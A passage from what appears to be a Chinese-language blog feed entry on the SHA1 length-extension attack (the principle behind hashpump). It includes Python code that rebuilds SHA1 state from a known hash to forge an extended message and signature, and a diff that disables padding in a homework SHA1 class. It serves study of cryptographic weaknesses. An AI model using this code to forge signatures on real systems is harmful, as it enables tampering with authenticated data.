class="string">'&gt;5I'</span>, unhexlify(orghash))  <span class="comment"># 算出之前轮结束的寄存器值, SHA1 是大端存储</span></span><br><span class="line"></span><br><span class="line">    sha1 = SHA1(<span class="string">''</span>)</span><br><span class="line">    sha1.ra, sha1.rb, sha1.rc, sha1.rd, sha1.re = regs</span><br><span class="line"></span><br><span class="line">    newmsg = bytearray()</span><br><span class="line">    newmsg += bytearray([<span class="number">0</span>] * keylen)</span><br><span class="line">    newmsg += bytearray(orgmsg)</span><br><span class="line">    newmsg = padding(newmsg) <span class="comment"># 还原 orghash 的区块, key 用 0 来填充</span></span><br><span class="line"></span><br><span class="line">    retmsg = newmsg[keylen:] <span class="comment"># 返回的 msg</span></span><br><span class="line">    retmsg += bytearray(addmsg)</span><br><span class="line"></span><br><span class="line">    newmsg += bytearray(addmsg)</span><br><span class="line">    newmsg = padding(newmsg) <span class="comment"># 因为最后 8 位是长度信息, 所以得将之前的区块一并来 padding</span></span><br><span class="line">    newmsg = newmsg[<span class="number">-64</span>:] <span class="comment"># 但最后计算时只需要最后一块就行, 因为已经将寄存器设为之前的算出来的结果</span></span><br><span class="line">    sha1.msg = bytearray(newmsg)</span><br><span class="line">    <span class="keyword">return</span> (retmsg, sha1.hexdigest())</span><br></pre></td></tr></table></figure><p><code>SHA1</code> 基本来自于<a href="https://github.com/rmb122/Cryptography/blob/master/SHA1.py" target="_blank" rel="noopener">密码学作业</a>, 稍微修改一下, 因为这里需要我们自己控制一个 <code>Block</code>, 是已经 <code>padding</code> 过的了,<br>不用重复, 所以把算结果之前的 <code>padding</code> 给跳过.  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">138c138</span><br><span class="line">&lt;         # self.__padding()</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;         self.__padding()</span><br></pre></td></tr></table></figure><p>最后当然是能实验成功的~  </p><p><img src="https://i.loli.net/2019/05/11/5cd5a7015838e.png" alt="">  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在学完 MD5/SHA1 之后, 很快就能搞懂 &lt;code&gt;hashpump&lt;/code&gt; 的原理, 本质是因为类 &lt;code&gt;MD&lt;/code&gt; 哈希函数&lt;br&gt;包括 MD5, SHA1, SHA2 都是将信息填充为一个 &lt;code&gt;Block&lt;/code&gt; 长度的倍数以后分 &lt;code&gt;Block&lt;/code&gt; 一轮轮计算的,&lt;br&gt;最后输出的是寄存器拼接在一起的值, 所以假设用以下公式计算签名  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="https://rmb122.com/tags/crypto/"/>
    
  </entry>
  
</feed>
